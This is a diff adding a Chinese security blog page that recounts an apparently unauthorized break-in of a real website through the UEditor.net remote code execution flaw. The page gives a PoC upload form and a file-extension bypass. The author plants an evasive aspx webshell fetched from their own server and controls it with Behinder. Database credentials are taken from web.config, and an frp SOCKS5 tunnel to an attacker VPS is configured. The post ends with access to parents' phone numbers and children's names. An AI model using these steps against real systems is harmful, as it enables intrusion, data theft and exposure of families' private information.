@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/wan1/css/main.css">
+
+
+<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="【实战】UEditor.net rce的一次渗透shell一次睡梦中梦到的站点  拿到一个站点之后，随便点了点，测了一下sql注入，没反应。 随后看到bp上的被动扫描发现UEditor.net rce   随后开始构造poc 1234567&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;xxx.com&#x2F;scripts&#x2F;ueditor&#x2F;net&#x2F;controller.ashx?action&#x3D;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【实战】UEditor.net rce的一次渗透">
+<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="十三の博客">
+<meta property="og:description" content="【实战】UEditor.net rce的一次渗透shell一次睡梦中梦到的站点  拿到一个站点之后，随便点了点，测了一下sql注入，没反应。 随后看到bp上的被动扫描发现UEditor.net rce   随后开始构造poc 1234567&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;xxx.com&#x2F;scripts&#x2F;ueditor&#x2F;net&#x2F;controller.ashx?action&#x3D;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173157156.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173350089.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173411060.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173638555.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174241352.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174707602.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174913465.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180654341.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180710809.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180734154.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180830085.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194623841.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194736099.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194854895.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200359745.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200638004.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201008346.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201620094.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201317706.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201359026.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202053653.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202124643.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202329456.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202646252.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420202708880.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203129525.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420203150864.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204036644.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420204610088.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210326953.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420210648416.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213038176.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420213258547.png">
+<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420215042417.png">
+<meta property="article:published_time" content="2023-04-20T13:56:59.000Z">
+<meta property="article:modified_time" content="2023-04-20T13:58:04.799Z">
+<meta property="article:author" content="十三">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173157156.png">
+
+<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-cn'
+  };
+</script>
+
+  <title>【实战】UEditor.net rce的一次渗透 | 十三の博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/wan1/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">十三の博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-ctf做题笔记">
+
+    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-python">
+
+    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+
+  </li>
+        <li class="menu-item menu-item-java">
+
+    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+
+  </li>
+        <li class="menu-item menu-item-读书笔记">
+
+    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+
+  </li>
+        <li class="menu-item menu-item-渗透测试">
+
+    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+
+  </li>
+        <li class="menu-item menu-item-基础">
+
+    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+
+  </li>
+        <li class="menu-item menu-item-轮子">
+
+    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+
+  </li>
+        <li class="menu-item menu-item-漏洞库">
+
+    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+
+  </li>
+        <li class="menu-item menu-item-工具">
+
+    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+
+  </li>
+        <li class="menu-item menu-item-代码审计">
+
+    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+
+  </li>
+        <li class="menu-item menu-item-逆向">
+
+    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+
+  </li>
+        <li class="menu-item menu-item-应急响应">
+
+    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+
+  </li>
+        <li class="menu-item menu-item-免杀">
+
+    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+
+  </li>
+        <li class="menu-item menu-item-靶场">
+
+    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+
+  </li>
+        <li class="menu-item menu-item-cve申请">
+
+    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+
+  </li>
+        <li class="menu-item menu-item-c语言">
+
+    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【实战】UEditor.net rce的一次渗透
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-04-20 21:56:59 / 修改时间：21:58:04" itemprop="dateCreated datePublished" datetime="2023-04-20T21:56:59+08:00">2023-04-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/wan1/categories/penetration/" itemprop="url" rel="index"><span itemprop="name">-penetration</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="【实战】UEditor-net-rce的一次渗透"><a href="#【实战】UEditor-net-rce的一次渗透" class="headerlink" title="【实战】UEditor.net rce的一次渗透"></a>【实战】UEditor.net rce的一次渗透</h1><h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><p>一次睡梦中梦到的站点</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173157156.png" alt="image-20230420173157156"></p>
+<p>拿到一个站点之后，随便点了点，测了一下sql注入，没反应。</p>
+<p>随后看到bp上的被动扫描发现UEditor.net rce</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173350089.png" alt="image-20230420173350089"></p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173411060.png" alt="image-20230420173411060"></p>
+<p>随后开始构造poc</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxx.com/scripts/ueditor/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后制作aspx马上传到服务器，开一个web服务，供目标机器访问。</p>
+<p>随后访问poc，输入aspx马的地址，</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420173638555.png" alt="image-20230420173638555"></p>
+<p>上传成功但是，拼接路径之后发现文件已经被删除了。</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174241352.png" alt="image-20230420174241352"></p>
+<p>怀疑被杀毒软件删除了。故使用tide的aspx免杀马重新上传，上传成功</p>
+<p>这里需要注意的是aspx马的地址,需要使用如下方式绕过，使其上传解析为aspx</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/ueditor.jpg?.aspx</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174707602.png" alt="image-20230420174707602"></p>
+<p>上传成功，随机使用冰蝎链接</p>
+<p>成功链接</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420174913465.png" alt="image-20230420174913465"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>拿下shell之后信息收集一波</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180654341.png" alt="image-20230420180654341"></p>
+<p>iis权限</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180710809.png" alt="image-20230420180710809"></p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180734154.png" alt="image-20230420180734154"></p>
+<p>win的系统</p>
+<p>tasklist发现存在阿里云的云盾</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420180830085.png" alt="image-20230420180830085"></p>
+<p>尝试iis6提权脚本，未果，疑似被云盾查杀，土豆也尝试过，无果。</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>随后一直困在提权里面，闲着无聊，翻了翻网站的配置文件</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194623841.png" alt="image-20230420194623841"></p>
+<p>一般这种asp的站，web.config里面的 <code>&lt;connectionStrings&gt;</code>节点里面会有数据库的账号密码，我们就去数据库里面看看。这个站用的是sqlserver，也就是mssql。之前看进程的时候看到的。</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194736099.png" alt="image-20230420194736099"></p>
+<p>确实发现了数据库账号密码，可惜不是sa权限的。</p>
+<p>用冰蝎自带的数据库管理工具链接上去</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420194854895.png" alt="image-20230420194854895"></p>
+<p>链接成功</p>
+<p>连接确实是链接到了，但是看不到表里面的数据啊。按理说，既然是配置文件中的账号，那么不会出现账号权限不足的情况。但是确实表里面什么东西都看不到，不得不怀疑是冰蝎本身的问题，所以我决定上代理，然后用正常的数据库管理工具尝试一下。</p>
+<p>然后老办法，frp传上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 你的攻击机</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line"># 启用加密，防止流量被拦截</span><br><span class="line">use_encryption = true</span><br><span class="line"># 启用压缩，提升流量转发速度</span><br><span class="line">use_compression = true</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<p>攻击机开启</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = vps_ip</span><br><span class="line">server_port = 4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200359745.png" alt="image-20230420200359745"></p>
+<p>成功建立连接，现在准备连接他的数据库。</p>
+<p>链接成功</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420200638004.png" alt="image-20230420200638004"></p>
+<p>确实是有数据的，只是冰蝎的工具有问题。</p>
+<p><img src="/wan1/wan1/2023/04/20/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91UEditor-net-rce%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/image-20230420201008346.png" alt="image-20230420201008346"></p>
+<p>发现大量的数据，各个家长的手机号码和孩子的名字。</p>
